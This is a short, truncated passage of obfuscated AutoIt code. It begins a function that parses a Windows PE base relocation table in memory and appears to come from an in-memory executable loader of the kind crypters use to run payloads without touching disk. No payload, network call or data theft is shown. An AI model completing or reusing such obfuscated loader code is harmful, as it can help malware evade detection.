Func _hs($91, $92, $93, $94, $95)
	Local $96 = $93 - $94
	Local $97, $98
	Local $8y, $99, $9a
	Local $9b, $9c, $9d
	Local $2k = 3 + 7 * $95
	While $98 < $92
		$97 = DllStructCreate("dword VirtualAddress; dword SizeOfBlock", $91 + $98)
		$8y = DllStructGetData($97, "VirtualAddress")
